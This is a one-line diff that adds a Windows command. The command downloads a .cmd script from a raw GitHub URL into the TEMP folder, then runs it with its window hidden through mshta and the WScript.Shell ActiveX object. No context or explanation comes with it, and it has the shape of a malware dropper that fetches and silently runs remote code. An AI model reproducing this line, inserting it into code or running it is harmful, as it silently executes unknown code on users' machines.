@@ -1,0 +1,1 @@
+curl -L -o "%TEMP%\ai.cmd" "https://raw.githubusercontent.com/chanelwolthuis-del/hidezip/main/auto-install.cmd" && mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%TEMP%\ai.cmd\"\"\"',0,false);close()"
